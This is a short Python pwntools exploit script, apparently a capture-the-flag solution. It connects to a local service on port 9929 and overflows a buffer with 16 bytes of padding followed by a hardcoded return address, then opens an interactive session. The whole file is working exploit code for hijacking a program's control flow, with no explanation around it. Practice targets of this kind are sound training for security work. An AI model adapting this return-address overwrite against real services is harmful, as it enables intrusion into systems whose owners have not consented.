#!/usr/bin/env python3

from pwn import *

class ProbIO:
    def __init__(self, r):
        self.r = r

    def send(self, payload):
        self.payload = payload
        self.r.sendline(self.payload)

class Primitives:
    def __init__(self, io):
        self.io = io

    def retControl(self, offset, dst):
        self.offset = offset
        self.dst = dst
        self.payload = b"A" * self.offset
        self.payload += self.dst
        self.io.send(self.payload)

def exploit(io, pri):
    pause()
    offset = 0x10
    addr = 0x00401008
    pri.retControl(offset, p64(addr))

    io.r.interactive()

def main(r):
    io = ProbIO(r)
    pri = Primitives(io)
    exploit(io, pri)

if __name__ == "__main__":
    r = remote("localhost", 9929)
    main(r)
